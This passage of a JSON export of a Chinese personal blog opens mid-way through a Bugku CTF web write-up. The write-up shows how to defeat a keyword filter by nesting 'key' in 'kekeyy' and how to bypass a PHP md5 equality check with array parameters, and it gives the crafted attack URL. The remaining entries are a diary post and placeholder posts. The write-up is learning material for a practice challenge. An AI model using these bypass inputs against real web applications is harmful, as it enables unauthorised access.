’替代，可以通过构造”kekeyy”来绕过；最后把key1和key2解析成变量；<br>代码要求构造出key1和key2的md5值相等，而它们本身却不相等，这时候用到一个小知识点：md5无法对数组进行构造，构造的结果都为NULL，这样我们只要让key1和key2是两个数组就好 (运用php弱类型比较绕过)<br>构造url:<a href=\"http://120.24.86.145:8002/web16/?kekeyy1%5B%5D=1&amp;kekeyy2%5B%5D=2\">http://120.24.86.145:8002/web16/?kekeyy1[]=1&amp;kekeyy2[]=2</a><br><img src=\"images/bugku13.2.png\" alt=\"13.2\"></p>\n</blockquote>\n</li>\n</ul>\n","text":"1.Url传参-get点开链接，出现代码<br> [Figure] ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":2,"path":"api/categories/ctf.json"},{"name":"web security","slug":"ctf/web-security","count":2,"path":"api/categories/ctf/web-security.json"},{"name":"bugku","slug":"ctf/web-security/bugku","count":1,"path":"api/categories/ctf/web-security/bugku.json"}],"tags":[{"name":"Write up","slug":"Write-up","count":1,"path":"api/tags/Write-up.json"}]},{"title":"bugku前","slug":"疯狂的大强","date":"2021-01-11T13:51:56.000Z","updated":"2021-01-11T15:07:15.843Z","comments":true,"path":"api/articles/疯狂的大强.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"寒假-day-1\"><a href=\"#寒假-day-1\" class=\"headerlink\" title=\"寒假 day 1\"></a>寒假 day 1</h2><p>家人们，大强正儿八经写的第一篇博客。激动的心，颤抖的手。<br>寒假第一天，在家也是做了不少事情，德才兼备的大强没少做家务，但其实最主要做的事情还是修改博客，学习怎样写博客，换域名。多亏了肖儿，让我少走了不少弯路.以后就和jingdaqiang.top一起过了。<br>明天开始刷bugku.</p>\n","text":"寒假 day 1家人们，大强正儿八经写的第一篇博客。激动的心，颤抖的手。<br>寒假第一天，在家也是做了不少事情，德才兼备的大强没少做家务，但其实最主要做的事情还是修改博客，学习怎样写博客，换域名。多亏了肖儿，让我少走了不少弯路.以后就和jingdaqiang.top一起过了。<","link":"","raw":null,"photos":[],"categories":[{"name":"2021","slug":"2021","count":1,"path":"api/categories/2021.json"},{"name":"Daliy life","slug":"2021/Daliy-life","count":1,"path":"api/categories/2021/Daliy-life.json"},{"name":"疯狂的大强","slug":"2021/Daliy-life/疯狂的大强","count":1,"path":"api/categories/2021/Daliy-life/疯狂的大强.json"}],"tags":[{"name":"写个日记","slug":"写个日记","count":1,"path":"api/tags/写个日记.json"}]},{"title":"菜鸟","slug":"first","date":"2021-01-11T06:34:59.450Z","updated":"2021-01-15T06:05:19.890Z","comments":true,"path":"api/articles/first.json","excerpt":"<h2 id=\"比较水\"><a href=\"#比较水\" class=\"headerlink\" title=\"比较水\"></a>比较水</h2><p>…..</p>","keywords":null,"cover":"images/tu1.0.jpg","content":null,"text":"比较水….. [Figure] 改的要全面","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":2,"path":"api/categories/ctf.json"},{"name":"web security","slug":"ctf/web-security","count":2,"path":"api/categories/ctf/web-security.json"},{"name":"Write Up","slug":"ctf/web-security/Write-Up","count":1,"path":"api/categories/ctf/web-security/Write-Up.json"}],"tags":[{"name":"小白","slug":"小白","count":1,"path":"api/tags/小白.json"}]},{"title":"second","slug":"second","date":"2020-12-24T04:12:58.000Z","updated":"2020-12-30T14:18:02.000Z","comments":true,"path":"api/articles/second.json","excerpt":"","keywords":null,"cover":null,"content":"<h3 id=\"second\"><a href=\"#second\" class=\"headerlink\" title=\"second\"></a>second</h3>","text":"second","link":"","raw":null,"photos":[],"categories":[{"name":"hello","slug":"hello","count":1,"path":"api/categories/hello.json"},{"name":"world","slug":"hello/world","count":1,"path":"api/categories/hello/world.json"}],"tags":[{"name":"first","slug":"first","count":1,"path":"api/tags/first.json"}]}]}